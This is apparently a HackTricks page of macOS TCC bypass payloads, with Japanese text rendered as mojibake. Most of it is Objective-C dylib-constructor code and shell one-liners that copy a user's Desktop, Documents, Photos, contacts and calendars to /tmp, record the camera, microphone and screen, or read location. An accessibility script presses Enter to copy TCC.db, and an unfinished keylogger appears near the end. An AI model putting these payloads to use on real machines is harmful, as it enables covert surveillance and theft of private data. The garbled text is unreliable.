# macOS TCC ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

- **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)** ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ ã§ **@carlospolopm** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
- **HackTricks** ã¨ **HackTricks Cloud** ã® github ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

### ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—

- **æ¨©é™**: ãªã—
- **TCC**: kTCCServiceSystemPolicyDesktopFolder

{% tabs %}
{% tab title="ObjetiveC" %}
`$HOME/Desktop` ã‚’ `/tmp/desktop` ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
NSString *tmpPhotosPath = @"/tmp/desktop";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
`$HOME/Desktop`ã‚’`/tmp/desktop`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
{% endtab %}
```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```
{% endtab %}
{% endtabs %}

### ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ

* **æ¨©é™**: ãªã—
* **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`

{% tabs %}
{% tab title="ObjetiveC" %}
`$HOME/Documents`ã‚’`/tmp/documents`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
NSString *tmpPhotosPath = @"/tmp/documents";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
`$HOME/`Documentsã‚’`/tmp/documents`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
{% endtab %}
```bash
cp -r "$HOME/Documents" "/tmp/documents"
```
{% endtab %}
{% endtabs %}

### ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

* **æ¨©é™**: ãªã—
* **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`

{% tabs %}
{% tab title="ObjetiveC" %}
`$HOME/Downloads`ã‚’`/tmp/downloads`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
NSString *tmpPhotosPath = @"/tmp/downloads";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
`$HOME/Dowloads`ã‚’`/tmp/downloads`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
{% endtab %}
```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```
{% endtab %}
{% endtabs %}

### å†™çœŸãƒ©ã‚¤ãƒ–ãƒ©ãƒª

* **æ¨©é™**: `com.apple.security.personal-information.photos-library`
* **TCC**: `kTCCServicePhotos`

{% tabs %}
{% tab title="ObjetiveC" %}
`$HOME/Pictures/Photos Library.photoslibrary`ã‚’`/tmp/photos`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
NSString *tmpPhotosPath = @"/tmp/photos";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
`$HOME/Pictures/Photos Library.photoslibrary` ã‚’ `/tmp/photos` ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
{% endtab %}
```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```
{% endtab %}
{% endtabs %}

### é€£çµ¡å…ˆ

* **æ¨©é™**: `com.apple.security.personal-information.addressbook`
* **TCC**: `kTCCServiceAddressBook`

{% tabs %}
{% tab title="ObjetiveC" %}
`$HOME/Library/Application Support/AddressBook`ã‚’`/tmp/contacts`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
NSString *tmpPhotosPath = @"/tmp/contacts";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
`$HOME/Library/Application Support/AddressBook`ã‚’`/tmp/contacts`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
{% endtab %}
```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```
{% endtab %}
{% endtabs %}

### ã‚«ãƒ¬ãƒ³ãƒ€ãƒ¼

* **æ¨©é™**: `com.apple.security.personal-information.calendars`
* **TCC**: `kTCCServiceCalendar`

{% tabs %}
{% tab title="ObjectiveC" %}
`$HOME/Library/Calendars` ã‚’ `/tmp/calendars` ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
NSString *tmpPhotosPath = @"/tmp/calendars";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
`$HOME/Library/Calendars`ã‚’`/tmp/calendars`ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
{% endtab %}
```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```
{% endtab %}
{% endtabs %}

### ã‚«ãƒ¡ãƒ©

* **æ¨©é™**: `com.apple.security.device.camera`
* **TCC**: `kTCCServiceCamera`

{% tabs %}
{% tab title="ObjectiveC - Record" %}
3ç§’ã®ãƒ“ãƒ‡ã‚ªã‚’éŒ²ç”»ã—ã€**`/tmp/recording.mov`**ã«ä¿å­˜ã—ã¾ã™ã€‚
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}
- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
NSError *error;
self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
if (error) {
NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
return;
}
if ([self.captureSession canAddInput:self.videoDeviceInput]) {
[self.captureSession addInput:self.videoDeviceInput];
}
self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([self.captureSession canAddOutput:self.movieFileOutput]) {
[self.captureSession addOutput:self.movieFileOutput];
}
}
- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = @"/tmp/recording.mov";
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}
- (void)stopRecording {
[self.movieFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
[videoRecorder startRecording];
[NSThread sleepForTimeInterval:3.0];
[videoRecorder stopRecording];
[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ObjectiveC - ãƒã‚§ãƒƒã‚¯" %}
ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã‚«ãƒ¡ãƒ©ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚
{% endtab %}
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to camera granted.");
return YES;
} else {
NSLog(@"[-] Access to camera denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
[CameraAccessChecker hasCameraAccess];
fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
ã‚«ãƒ¡ãƒ©ã§å†™çœŸã‚’æ’®ã‚‹
{% endtab %}
```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```
{% endtab %}

### ãƒã‚¤ã‚¯

* **æ¨©é™**: **com.apple.security.device.audio-input**
* **TCC**: `kTCCServiceMicrophone`

{% tabs %}
{% tab title="ObjectiveC - Record" %}
5ç§’ã®ã‚ªãƒ¼ãƒ‡ã‚£ã‚ªã‚’éŒ²éŸ³ã—ã€`/tmp/recording.m4a`ã«ä¿å­˜ã—ã¾ã™ã€‚
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}

- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
NSError *error;
self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

if (error) {
NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
return;
}

if ([self.captureSession canAddInput:self.audioDeviceInput]) {
[self.captureSession addInput:self.audioDeviceInput];
}

self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

if ([self.captureSession canAddOutput:self.audioFileOutput]) {
[self.captureSession addOutput:self.audioFileOutput];
}
}

- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}

- (void)stopRecording {
[self.audioFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

freopen("/tmp/logs.txt", "a", stderr);
AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

[audioRecorder startRecording];
[NSThread sleepForTimeInterval:5.0];
[audioRecorder stopRecording];

[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ObjectiveC - ãƒã‚§ãƒƒã‚¯" %}
ã‚¢ãƒ—ãƒªãŒãƒã‚¤ã‚¯ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚
{% endtab %}
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to microphone granted.");
return YES;
} else {
NSLog(@"[-] Access to microphone denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
[MicrophoneAccessChecker hasMicrophoneAccess];
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
5ç§’é–“ã®ã‚ªãƒ¼ãƒ‡ã‚£ã‚ªã‚’éŒ²éŸ³ã—ã€`/tmp/recording.wav`ã«ä¿å­˜ã—ã¾ã™ã€‚
{% endtab %}
```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```
{% endtab %}
{% endtabs %}

### ãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³

{% hint style="success" %}
ã‚¢ãƒ—ãƒªãŒãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã€**ãƒ—ãƒ©ã‚¤ãƒã‚·ãƒ¼ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£**ã‹ã‚‰**ä½ç½®æƒ…å ±ã‚µãƒ¼ãƒ“ã‚¹**ã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æœ‰åŠ¹ã«ã—ãªã„ã¨ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã€‚
{% endhint %}

* **æ¨©é™**: `com.apple.security.personal-information.location`
* **TCC**: `/var/db/locationd/clients.plist` ã§è¨±å¯ã•ã‚Œã‚‹

{% tabs %}
{% tab title="ObjectiveC" %}
`/tmp/logs.txt` ã«ãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ›¸ãè¾¼ã‚€
```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *location = [locations lastObject];
NSLog(@"Current location: %@", location);
exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
NSLog(@"Error getting location: %@", error);
exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSLog(@"Getting location");
CLLocationManager *locationManager = [[CLLocationManager alloc] init];
LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
locationManager.delegate = delegate;

[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
[locationManager startUpdatingLocation];

NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
while (true) {
[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}

NSLog(@"Location completed successfully.");
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
å ´æ‰€ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã—ã¾ã™
{% endtab %}
```
???
```
{% endtab %}
{% endtabs %}

### ã‚¹ã‚¯ãƒªãƒ¼ãƒ³éŒ²ç”»

* **æ¨©é™**: ãªã—
* **TCC**: `kTCCServiceScreenCapture`

{% tabs %}
{% tab title="ObjectiveC" %}
ãƒ¡ã‚¤ãƒ³ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚’5ç§’é–“`/tmp/screen.mov`ã«éŒ²ç”»ã—ã¾ã™ã€‚
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording error: %@", error);
} else {
NSLog(@"Recording finished successfully.");
}
exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
if ([captureSession canAddInput:screenInput]) {
[captureSession addInput:screenInput];
}

AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([captureSession canAddOutput:fileOutput]) {
[captureSession addOutput:fileOutput];
}

[captureSession startRunning];

MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

// Run the loop for 5 seconds to capture
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
[fileOutput stopRecording];
});

CFRunLoopRun();
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{% endtab %}

{% tab title="ã‚·ã‚§ãƒ«" %}
ãƒ¡ã‚¤ãƒ³ç”»é¢ã‚’5ç§’é–“è¨˜éŒ²ã—ã¾ã™
{% endtab %}
```bash
screencapture -V 5 /tmp/screen.mov
```
{% endtab %}
{% endtabs %}

### ã‚¢ã‚¯ã‚»ã‚·ãƒ“ãƒªãƒ†ã‚£

* **æ¨©é™**: ãªã—
* **TCC**: `kTCCServiceAccessibility`

TCCæ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€Finderã®åˆ¶å¾¡ã‚’å—ã‘å…¥ã‚Œã€Enterã‚­ãƒ¼ã‚’æŠ¼ã—ã¦TCCã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
CGEventPost(kCGHIDEventTap, keyDownEvent);
CGEventPost(kCGHIDEventTap, keyUpEvent);
if (keyDownEvent) CFRelease(keyDownEvent);
if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
NSLog(@"Starting AppleScript");
NSString *scriptSource = @"tell application \"Finder\"\n"
"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
"set targetFolder to POSIX file \"/tmp\" as alias\n"
"duplicate file sourceFile to targetFolder with replacing\n"
"end tell\n";

NSDictionary *errorDict = nil;
NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
[appleScript executeAndReturnError:&errorDict];

if (errorDict) {
NSLog(@"AppleScript Error: %@", errorDict);
}
}

int main() {
@autoreleasepool {
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
RunAppleScript();
});

// Simulate pressing the Enter key every 0.1 seconds
NSLog(@"Starting key presses");
for (int i = 0; i < 10; ++i) {
SimulateKeyPress((CGKeyCode)36); // Key code for Enter
usleep(100000); // 0.1 seconds
}
}
return 0;
}
```
{% endtab %}

{% tab title="Keylogger" %}
**`/tmp/keystrokes.txt`**ã«æŠ¼ã•ã‚ŒãŸã‚­ãƒ¼ã‚’ä¿å­˜ã—ã¾ã™ã€‚
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
if (fileHandle) {
[fileHandle seekToEndOfFile];
[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
[fileHandle closeFile];
} else {
// If the file does not exist, create it
[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
if (type == kCGEventKeyDown) {
CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

NSString *keyString = nil;
// First, handle special non-printable keys
switch (keyCode) {
case kVK_Return: keyString = @"<Return>"; break;
case kVK_Tab: keyString = @"<Tab>"; break;
case kVK_Space: keyString = @"<Space>"; break;
case kVK_Delete: keyString = @"<Delete>"; break;
case kVK_Escape: keyString = @"<Escape>"; break;
case kVK_Command: keyString = @"<Command>"; break;
case kVK_Shift: keyString = @"<Shift>"; break;
case kVK_CapsLock: keyString = @"<CapsLock>"; break;
case kVK_Option: keyString = @"<Option>"; break;
case kVK_Control: keyString = @"<Control>"; break;
case kVK_RightControl: keyString = @"<Control>"; break;
case kVK_RightShift: keyString = @"<Shift>"; break;
case kVK_RightOption: keyString = @"<Option>"; break;
case kVK_Function: keyString = @"<Function>"; break;
case kVK_F1: keyString = @"<F1>"; break;
case kVK_F2: keyString = @"<F2>"; break;
case kVK_F3: keyString = @"<F3>"; break;
// Add more cases here for other non-printable keys...
